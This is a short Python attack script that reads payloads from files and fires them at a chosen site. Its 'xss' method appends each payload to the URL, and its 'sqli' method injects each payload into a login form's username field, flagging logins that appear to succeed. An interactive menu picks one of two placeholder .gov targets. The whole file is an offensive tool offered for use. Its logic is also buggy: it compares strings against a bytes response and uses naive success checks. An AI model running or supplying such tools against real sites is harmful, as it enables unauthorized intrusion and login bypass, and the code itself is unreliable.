import requests


class Attack:
    def __init__(self, site, file):
        self.s = site
        self.f = file
    def xss(self):
        with open(self.f, "r") as what:
            eric = what.readlines()

        for x in eric:
            response = requests.post("https://" + self.s + "/" + x)
            print(response.status_code)
            if response.status_code == 200:
                print(x + "this is a successful payload")
                print("https://" + self.s + "/" + x)
            else:
                print(x + "is not a successful payload")
    
    def sqli(self):
        stupid = open(self.f, "r")
        for x in stupid:
            x = x.strip(" ")
            dictionary = {
                "username": x,
                "password": "efwefew",
                "Login":"submit"
            }
            response = requests.post(self.s, data=dictionary)
            if "login failed" in response.content or "failed" in response.content:
                print("invalid payload")
            elif "success" in response.content:
                print("login succesful!")
                print("[+]Payload:" + x)
            
site1 = Attack("somemusite.gov", "example.txt")
site2 = Attack("othermusite.gov", "example2.txt")

first = input("choose a site:").lower()
if "somemusite" in first:
    new = input("what kind of attack do you want to do?").lower()
    if new == "xss":
        site1.xss()
    elif new == "sqli":
        site1.sqli()
elif "othermusite" in first:
    this = input("what kind of attack do you want to do?").lower()
    if this == "xss":
        site2.xss()
    elif this == "sqli":
        site2.sqli()